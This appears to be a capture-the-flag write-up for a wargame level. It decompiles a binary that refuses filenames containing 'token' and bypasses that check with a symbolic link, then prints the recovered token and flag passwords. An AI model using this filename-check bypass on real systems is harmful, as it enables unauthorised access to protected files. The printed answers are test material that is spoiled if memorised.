# Step 1
We have two files. One is a binary file `level08` and the other `token`.
Run the binary say to give a file for argument but `token` has no access permissions.

So we decompile the binary file with `ghidra` and we see that:

```c
pcVar1 = strstr((char *)param_2[1], "token");
if (pcVar1 != (char *)0x0) {
  printf("You may not access '%s'\n", param_2[1]);
  exit(1);
}
```

The binary checks if the argument contains the string `token` and if it does, it exits.


# Step 2

We can create a symbolic link to the `token` file and name it `link` for example.

Then we run the binary with the symbolic link as argument.

```bash
ln -s /home/user/level08/token /tmp/link
./level08 /tmp/link
```

### Result

`quif5eloekouj29ke0vouxean`
This is the password for the `flag08` user.

Then we can launch the `getflag` command under `flag08`.

flag: `25749xKZ8L7DkSCwJkT9dyv6f`. it is the password for the `level09` user.
